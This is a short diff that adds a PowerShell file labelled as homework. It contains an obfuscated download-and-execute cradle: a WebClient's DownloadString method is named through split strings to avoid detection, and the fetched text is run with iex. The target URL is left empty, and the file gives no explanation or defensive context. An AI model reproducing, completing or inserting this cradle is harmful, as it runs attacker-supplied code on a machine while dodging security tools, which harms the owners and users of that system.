@@ -1,0 +1,6 @@
+# homework about powershell stuff
+$u = ""
+$x = (new-object net.webclient)
+$y = "Down"+"load"+"String"
+$z = $x.$y.Invoke($u)
+iex $z
